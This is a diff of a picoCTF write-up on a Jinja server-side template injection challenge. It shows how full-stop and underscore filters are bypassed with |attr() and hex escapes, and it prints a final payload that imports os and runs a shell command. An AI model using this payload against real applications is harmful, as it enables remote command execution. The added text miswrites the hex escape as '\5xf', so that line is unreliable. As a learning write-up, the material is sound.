@@ -33,8 +33,10 @@ I tried a few other payloads like {% raw %} `{{7 * 7}}` {% endraw %} which did n
 
 {% raw %} `{{ config.items }}` {% endraw %}  -> Confirmed that the fullstop was blacklisted  
 So I went online and found a way to use the fullstop without having to type it out by using |attr() as an alternative.  
+![Here lies a picture](/assets/img/picoCTF/ssti2/ssti2_bypass_cheatsheet.png)  w
+
 {% raw %} `{{ cycler|attr('__init__') }}` {% endraw %}  -> Confirmed that the underscore was blacklisted  
-I decided the encode the underscore in hex before sending it out, that way the underscore would not be blacklisted but still parsed as an underscore when ran as code.  
+We can escape the underscore by using its hex value \5xf, this will bypass the filter but still be recognised as an underscore when the code is running.  
 
 Final Payload: {% raw %} `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}` {% endraw %}  
 I simply replaced the fullstops and the underscores in the final payload for SSTI1 and it worked as it bypassed the filter and gave me the flag  
